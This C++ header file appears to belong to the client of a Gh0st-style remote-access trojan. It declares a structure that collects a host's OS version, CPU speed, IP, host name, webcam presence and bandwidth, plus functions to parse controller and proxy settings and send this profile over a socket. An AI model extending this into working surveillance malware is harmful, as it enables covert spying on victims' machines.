#include "stdafx.h"
#include <wininet.h>
#include <stdlib.h>
#include <Vfw.h>
//#include "decode.h"
#include "until.h"
#pragma comment(lib,"vfw32.lib")
#pragma comment(lib, "wininet.lib")
#include "ClientSocket.h"

typedef struct
{	
	BYTE			bToken;			// = 1
	OSVERSIONINFOEX	OsVerInfoEx;	// 版本信息
	int				CPUClockMhz;	// CPU主频
	IN_ADDR			IPAddress;		// 存储32位的IPv4的地址数据结构
	char			HostName[50];	// 主机名
	bool			bIsWebCam;		// 是否有摄像头
	DWORD			dwSpeed;		// 网速
}LOGININFO;


void SplitLoginInfo(char *lpDecodeString, char **lppszHost, LPDWORD lppPort, char **lppszProxyHost, LPDWORD lppProxyPort,
	char **lppszProxyUser, char **lppszProxyPass);
// Get System Information
DWORD CPUClockMhz();

bool IsWebCam();

UINT GetHostRemark(LPCTSTR lpServiceName, wchar_t* lpBuffer, UINT uSize);

int sendLoginInfo(LPCTSTR strServiceName, CClientSocket *pClient, DWORD dwSpeed);
